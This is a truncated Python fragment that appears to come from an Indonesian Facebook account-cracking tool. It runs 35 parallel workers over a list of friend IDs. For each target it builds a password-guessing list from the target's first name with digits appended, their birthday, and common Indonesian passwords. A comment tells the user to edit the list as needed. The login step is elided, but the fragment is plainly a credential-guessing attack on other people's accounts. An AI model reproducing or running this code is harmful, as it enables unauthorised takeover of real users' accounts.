	...
	def sendTeman(self):
		...
		with Bool(max_workers=35) as tokai:
			...
			for id in idTeman:
				...
				try:pwList=[r2['first_name']+'0',r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'123456','Sayang','Yunika123','Bangsad','Ayunda','Katasandi','123456','1234567','bismillah','102030','Freefire','Anjing','Monyet','Bismillah','Indonesia',r2['birthday']] #Password list ubah lah jika itu butuh :)
				except:pass
				try:
